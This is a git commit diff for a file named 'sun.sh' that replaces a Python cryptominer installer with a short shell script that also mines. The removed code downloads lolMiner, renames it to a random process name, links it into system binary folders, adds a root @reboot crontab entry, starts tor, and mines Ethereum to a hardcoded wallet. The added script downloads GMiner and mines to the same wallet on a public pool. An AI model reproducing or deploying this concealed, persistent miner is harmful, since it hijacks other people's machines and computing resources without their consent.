31fdc5e6195dea0a0a3af7a20afaccb23b25d911
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-06-12 17:02:08 +0700

    Update sun.sh

--- sun.sh
+++ sun.sh
@@ -1,59 +1,15 @@
-__author__ = 'root'
-import time
-import urllib2
-import urllib
-import os,sys
-import subprocess
-from httplib import BadStatusLine
-from socket import error as socket_error
-import multiprocessing
-import ast, random, string
-useproxy = 0
-os.system('chmod 777 ' + __file__)
-program = ''
-link_github = 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz'
-link_folder = 'lolMiner_v1.51a_Lin64.tar.gz'
-for k in range(1, 8, 1):
-    program += random.choice(string.ascii_lowercase)
-os.system('pkill ' + program)
+#!/bin/sh
 
-try:
-    os.system('apt-get update -y')
-    os.system('apt-get install -y build-essential cmake libuv1-dev openssl libssl-dev libhwloc-dev wget gcc make python python-dev tor screen git')
-except:
-    pass
-try:
 
-    if not os.path.isfile('/root/1.51a/lolMiner'):
-        os.chdir('/root')
-        #os.system('rm -rf %s' %link_folder)
-        os.system('wget ' + link_github)
-        os.system('tar -zxf ' + link_folder)
-        os.chdir('/root/1.51a')
-        workingdir = os.getcwd()
-        os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' +'/usr/local/bin/' + program)
-        os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' + '/usr/bin/' + program)
-        time.sleep(2)
-    else:
-        try:
-            os.chdir('/root/1.51a')
-            workingdir = os.getcwd()
-            os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' + '/usr/local/bin/' + program)
-            os.system('ln -s -f ' + workingdir + '/' + 'lolMiner' + ' ' + '/usr/bin/' + program)
-            time.sleep(2)
-        except:
-            pass
-    try:
-        path = '/var/spool/cron/crontabs/root'
-        data = '@reboot screen -dm python /etc/dao.py'
-        os.system('echo %s > %s' %(data, path))
-        os.system('chmod 600 %s' %path)
-    except:
-        pass
-except:
-    pass
+wget https://github.com/develsoftware/GMinerRelease/releases/download/2.73/gminer_2_73_linux64.tar.xz
+tar -xvf gminer_2_73_linux64.tar.xz
+echo "#!/bin/sh" > eth_zil.sh
+echo "./miner --algo eth --server us-east.ezil.me:5555 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.zil1evv9h6mrupf8sgxnj6t8ljj2rl76l0pekhv6ed -l log.txt" >> eth_zil.sh
+chmod 777 eth_zil.sh
 
-os.system('tor &')
-time.sleep(60)
+echo "#!/bin/sh" > run.sh
 
-os.system (program + ' --algo ETHASH --pool 172.65.247.152:4444 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.'+program)
+echo "timeout 7h ./eth_zil.sh" >> run.sh
+
+chmod 777 run.sh
+./run.sh
